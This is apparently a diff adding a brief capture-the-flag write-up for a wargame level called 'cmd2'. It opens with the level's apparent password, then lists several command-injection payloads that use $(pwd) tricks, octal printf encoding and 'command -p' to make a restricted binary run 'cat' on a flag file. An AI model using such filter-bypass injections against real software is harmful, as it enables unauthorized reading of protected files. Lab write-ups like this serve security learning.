@@ -1,0 +1,17 @@
+passwd : mommy now I get what PATH environment is for :)
+
+###Sol1
+cd /    ### $pwd = /
+./home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'
+
+###Sol2
+###Encode command(/bin/cat flag) as octal and print it
+./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
+
+###Sol3
+###command -p supplies a default path
+./cmd2 'command -p cat f???'
+
+###Sol4
+###string indexing for desired characters(?)
+###should be doable, but haven't tried
